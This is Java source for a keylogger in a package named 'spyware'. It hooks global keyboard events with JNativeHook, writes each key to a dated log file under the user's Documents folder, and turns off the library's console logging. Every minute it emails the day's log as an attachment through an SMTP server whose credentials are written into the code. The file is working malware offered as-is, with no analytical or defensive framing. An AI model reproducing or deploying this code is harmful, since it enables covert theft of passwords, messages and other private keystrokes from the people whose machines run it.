package spyware;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.time.LocalDate;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class Keylogger  implements NativeKeyListener{
	
     private static String LOG_DIRECTORY = System.getProperty("user.home") + File.separator + "Documents" + File.separator + "logs2";
	 private static String LOG_FILE_PATH;
	 private static LocalDate currentDate;
	 
	 static {
	        updateLogFilePath();
	    }
	
	 private static void updateLogFilePath() {
	        currentDate = LocalDate.now();
	        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd");
	        LOG_FILE_PATH = LOG_DIRECTORY + File.separator + "log-" + currentDate.format(formatter) + ".txt";
	    }
	 
	 private static void createLogDirectoryIfNeeded() {
	        File logDirectory = new File(LOG_DIRECTORY);
	        if (!logDirectory.exists()) {
	            logDirectory.mkdirs();
	        }
	    }

	    @Override
	    public void nativeKeyPressed(NativeKeyEvent e) {
	        // If the Escape key is pressed, unregister the native hook
	        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
	            try {
	                GlobalScreen.unregisterNativeHook();
	            } catch (NativeHookException nativeHookException) {
	                nativeHookException.printStackTrace();
	            }
	        }
	    }

	    @Override
	    public void nativeKeyReleased(NativeKeyEvent e) {       
	        // Write the key release event to the log file
	        try (BufferedWriter writer = new BufferedWriter(new FileWriter(LOG_FILE_PATH, true))) {
	            writer.write(NativeKeyEvent.getKeyText(e.getKeyCode()));
	            writer.newLine(); // Add a new line after each key event
	        } catch (IOException ioException) {
	            ioException.printStackTrace();
	        }
	        
	        if (!LocalDate.now().equals(currentDate)) {
	            updateLogFilePath();
	        }
	    }

	    @Override
	    public void nativeKeyTyped(NativeKeyEvent e) {
	        if (!LocalDate.now().equals(currentDate)) {
	            updateLogFilePath();
	        }
	    }
	    
	    private static void scheduleEmailSending() {
	        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
	        scheduler.scheduleAtFixedRate(() -> {
	            try {
	            	 createLogDirectoryIfNeeded();
	            	
	                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd");
	                String logFilePath = "C:\\Users\\User\\Documents\\logs\\log-" + LocalDate.now().format(formatter) + ".txt";
	                
	                
	                EmailSender.sendEmail(
	                    "sandbox.smtp.mailtrap.io", // SMTP server
	                    "2525",              // SMTP port
	                    "47d47a8d8b9baf", // Sender email
	                    "bc64dc52a88f49",    // Sender password
	                    "recipient_email@example.com", // Recipient email
	                    "Daily Keylogger Log", // Subject
	                    "Please find the attached keylogger log for today.", // Message
	                    logFilePath // Attachment
	                );
	                System.out.println("Email sent successfully!");
	            } catch (Exception e) {
	                e.printStackTrace();
	            }
	        },  0, 1, TimeUnit.MINUTES);
	    }

	    public static void main(String[] args) {
	        // Disable the library's default logging to avoid cluttering the console
	        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
	        logger.setLevel(java.util.logging.Level.OFF);

	        try {
	            // Register the native hook to capture global key events
	            GlobalScreen.registerNativeHook();
	        } catch (NativeHookException ex) {
	            System.err.println("There was a problem registering the native hook.");
	            System.err.println(ex.getMessage());
	            System.exit(1);
	        }

	        // Add the keylogger as a native key listener
	        GlobalScreen.addNativeKeyListener(new Keylogger());
	        
	        scheduleEmailSending();
	    }
	}